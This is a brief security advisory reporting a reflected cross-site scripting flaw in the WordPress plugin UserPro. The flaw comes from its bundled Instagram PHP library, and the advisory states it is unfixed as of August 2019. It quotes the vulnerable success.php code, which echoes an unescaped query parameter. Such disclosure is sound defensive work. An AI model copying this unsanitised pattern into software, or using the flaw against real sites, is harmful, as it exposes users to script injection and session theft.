The WordPress plug-in 'UserPro' uses a Instagram library (Instagram PHP API V2 by cosenary) that
is vulnerable for Reflected Cross-Site Scripting (XSS).

There is more vulnerable code in 'UserPro' core, might release that later.

As of today (25 August 2019) this issue is unfixed.

Vulnerable code: (success.php on line 36)

    if (isset($_GET['error'])) {
        echo 'An error occurred: ' . $_GET['error_description'];
    }
